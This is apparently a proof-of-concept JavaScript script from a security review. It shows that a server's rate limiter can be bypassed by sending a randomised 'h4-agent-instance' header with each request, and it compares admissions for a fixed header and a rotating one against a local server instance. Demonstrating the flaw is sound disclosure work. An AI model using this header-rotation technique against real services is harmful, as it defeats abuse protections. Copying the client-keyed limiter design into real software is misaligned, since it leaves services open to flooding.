// PoC 1: Anonymous per-subject rate limit bypass via client-controlled `h4-agent-instance`.
//
// src/server.js _subjectFromRequest():
//   const inst = h['h4-agent-instance'] || h['h4-agent'] || '';
//   return sha256(`${inst}|${net}`).slice(0,16)
//
// `inst` comes straight from a request header. An unauthenticated caller can mint a
// brand-new Limiter bucket per request by randomising it.

import { H4Server } from '../src/server.js';
import { Limiter } from '../src/limits.js';

function req(instanceId, i) {
  return {
    headers: [
      [':method', 'GET'],
      [':path', '/x'],
      [':scheme', 'https'],
      ...(instanceId ? [['h4-agent-instance', instanceId]] : []),
    ],
    intent: { mode: 0, idem: '', deadlineMs: 30000, costCeiling: 0, maxShape: 0, dedup: '' },
    cost: { predicted: 0, costClass: 0, effortBits: 0, budgetRemaining: 0, value: 0, tokenBudget: 0 },
    peer: '203.0.113.9',
    body: null,
  };
}

const server = new H4Server({
  routes: { 'GET /x': async () => ({ status: 200, body: { ok: true }, cost: 1 }) },
  limiter: new Limiter({ budget: 20, windowMs: 10_000 }), // tiny budget to make it obvious
});
server.route('GET /x', async () => ({ status: 200, body: { ok: true }, cost: 1 }));

const now = Date.now();

// A) honest client: stable instance id
let admitted = 0;
for (let i = 0; i < 200; i++) {
  const r = await server.handle(req('agent-1', i), now);
  if (!r.reject) admitted++;
}
console.log(`[A] honest client, fixed h4-agent-instance : admitted ${admitted}/200`);

// B) rotating client: fresh instance id per request
const server2 = new H4Server({
  routes: { 'GET /x': async () => ({ status: 200, body: { ok: true }, cost: 1 }) },
  limiter: new Limiter({ budget: 20, windowMs: 10_000 }),
});
admitted = 0;
for (let i = 0; i < 200; i++) {
  const r = await server2.handle(req(`agent-${i}-${Math.random()}`, i), now);
  if (!r.reject) admitted++;
}
console.log(`[B] rotating h4-agent-instance           : admitted ${admitted}/200`);
console.log(`    limiter subject buckets created      : ${server2.limiter.entries.size}`);
console.log(`    net (IP) bucket spent / allowance    : ${server2.limiter.netEntries.get('203.0.113.9')?.spent} / ${server2.limiter.budget * server2.limiter.netMultiplier}`);
